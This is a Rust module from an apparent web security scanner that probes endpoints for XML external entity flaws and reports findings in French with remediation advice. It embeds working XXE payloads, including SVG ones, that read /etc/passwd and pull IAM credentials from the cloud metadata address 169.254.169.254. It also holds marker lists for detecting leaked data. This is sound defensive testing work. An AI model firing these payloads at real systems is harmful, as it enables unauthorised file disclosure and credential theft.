use nevelio_core::types::{Finding, Severity};
use nevelio_core::HttpClient;

use crate::{Endpoint, XxeEntry};

const XML_CONTENT_TYPES: &[&str] = &["application/xml", "text/xml", "application/soap+xml"];

const SVG_XXE_PAYLOAD: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>"#;

const SVG_XXE_SSRF_PAYLOAD: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>"#;

const SVG_DETECT_MARKERS: &[&str] = &["root:x:", "daemon:", "nobody:", "www-data:", "/bin/bash"];
const IMDS_MARKERS: &[&str] = &["iam", "security-credentials", "ami-id", "instance-id"];

pub(super) async fn check_xxe(
    client: &HttpClient,
    ep: &Endpoint,
    payloads: &[XxeEntry],
) -> Vec<Finding> {
    // XXE requires the server to process an XML body — only relevant for write methods
    if !matches!(ep.method.as_str(), "POST" | "PUT" | "PATCH") {
        return vec![];
    }

    // Try each content-type the server might accept
    for ct in XML_CONTENT_TYPES {
        for entry in payloads {
            // Skip blind OOB payloads (no in-band detection possible without callback server)
            if entry.kind == "blind" {
                continue;
            }

            let req = match client
                .inner()
                .request(
                    ep.method.parse().unwrap_or(reqwest::Method::POST),
                    &ep.full_url,
                )
                .header("Content-Type", *ct)
                .body(entry.value.trim().to_string())
                .build()
            {
                Ok(r) => r,
                Err(_) => continue,
            };

            let Ok(resp) = client.send(req).await else {
                continue;
            };

            let status = resp.status().as_u16();
            let body = resp.text().await.unwrap_or_default();

            let triggered = if !entry.detect.is_empty() {
                body.contains(entry.detect.as_str())
            } else {
                // No specific marker: a 200 on a SSRF probe is suspicious
                entry.kind == "ssrf" && status == 200 && !body.is_empty()
            };

            if triggered {
                let (title, cwe, severity, cvss) = match entry.kind.as_str() {
                    "ssrf" => (
                        format!("XXE + SSRF — {}", ep.full_url),
                        "CWE-918",
                        Severity::Critical,
                        9.8,
                    ),
                    _ => (
                        format!("XXE File Disclosure — {}", ep.full_url),
                        "CWE-611",
                        Severity::Critical,
                        9.1,
                    ),
                };

                let mut f = Finding::new(
                    title,
                    severity,
                    cvss,
                    "injection",
                    ep.full_url.clone(),
                    ep.method.clone(),
                );
                f.description = format!(
                    "L'endpoint {} accepte du contenu XML ({}) et traite les entités externes. \
                     Un attaquant peut lire des fichiers locaux du serveur ou déclencher des requêtes \
                     vers des ressources internes.",
                    ep.full_url, ct
                );
                f.proof = format!(
                    "Payload envoyé avec Content-Type: {}\nRéponse HTTP {}: {}",
                    ct,
                    status,
                    body.chars().take(200).collect::<String>()
                );
                f.recommendation =
                    "Désactiver le traitement des entités externes dans le parseur XML \
                     (FEATURE_SECURE_PROCESSING, setExpandEntityReferences(false)). \
                     Utiliser une allowlist de Content-Types acceptés. \
                     Valider et assainir tout contenu XML avant traitement."
                        .to_string();
                f.cwe = Some(cwe.to_string());
                f.references = vec![
                    "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing".to_string(),
                    "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html".to_string(),
                ];
                return vec![f];
            }
        }
    }

    vec![]
}

pub(super) async fn check_xxe_svg(client: &HttpClient, ep: &Endpoint) -> Vec<Finding> {
    if !matches!(ep.method.as_str(), "POST" | "PUT" | "PATCH") {
        return vec![];
    }

    let probes: [(&str, &[&str], &str, &str); 2] = [
        (
            SVG_XXE_PAYLOAD,
            SVG_DETECT_MARKERS,
            "file",
            "image/svg+xml",
        ),
        (
            SVG_XXE_SSRF_PAYLOAD,
            IMDS_MARKERS,
            "ssrf",
            "image/svg+xml",
        ),
    ];
    for (payload, detect, kind, ctype) in &probes {
        let Ok(req) = client
            .inner()
            .request(
                ep.method.parse().unwrap_or(reqwest::Method::POST),
                &ep.full_url,
            )
            .header("Content-Type", *ctype)
            .body(payload.to_string())
            .build()
        else {
            continue;
        };

        let Ok(resp) = client.send(req).await else {
            continue;
        };
        let status = resp.status().as_u16();
        let body = resp.text().await.unwrap_or_default();

        let triggered = detect.iter().any(|m| body.contains(m));
        if triggered {
            let (title, cwe, severity, cvss) = match *kind {
                "ssrf" => (
                    format!("XXE via SVG + SSRF — {}", ep.full_url),
                    "CWE-918",
                    Severity::Critical,
                    9.8,
                ),
                _ => (
                    format!("XXE via SVG — Divulgation fichier local — {}", ep.full_url),
                    "CWE-611",
                    Severity::Critical,
                    9.1,
                ),
            };

            let mut f = Finding::new(
                title,
                severity,
                cvss,
                "injection",
                ep.full_url.clone(),
                ep.method.clone(),
            );
            f.description = format!(
                "L'endpoint {} accepte un fichier SVG et traite les entités XML externes. \
                 Un attaquant peut exfiltrer des fichiers locaux ou déclencher des requêtes \
                 vers des ressources internes via une image SVG malveillante.",
                ep.full_url
            );
            f.proof = format!(
                "Payload SVG envoyé avec Content-Type: {}\nHTTP {} — Marqueur détecté dans la réponse",
                ctype, status
            );
            f.recommendation =
                "Désactiver le traitement des entités XML externes dans le parseur SVG. \
                 Valider le Content-Type et rejeter les images SVG si non requises. \
                 Utiliser une bibliothèque de sanitisation SVG (ex. DOMPurify pour SVG)."
                    .to_string();
            f.cwe = Some(cwe.to_string());
            f.references = vec![
                "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing".to_string(),
                "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html".to_string(),
            ];
            return vec![f];
        }
    }

    vec![]
}
